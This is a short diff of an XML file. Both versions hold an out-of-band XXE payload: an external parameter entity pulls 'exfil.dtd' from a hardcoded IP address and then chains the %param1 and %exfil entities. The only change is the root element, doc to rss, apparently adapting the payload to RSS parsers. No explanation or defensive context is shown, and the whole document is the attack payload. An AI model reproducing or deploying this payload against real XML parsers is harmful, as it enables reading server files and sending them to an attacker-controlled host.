@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://54.89.35.178/exfil.dtd"> 
+<!DOCTYPE rss [<!ENTITY % dtd SYSTEM "http://54.89.35.178/exfil.dtd"> 
 %dtd;
 %param1;
 %exfil;
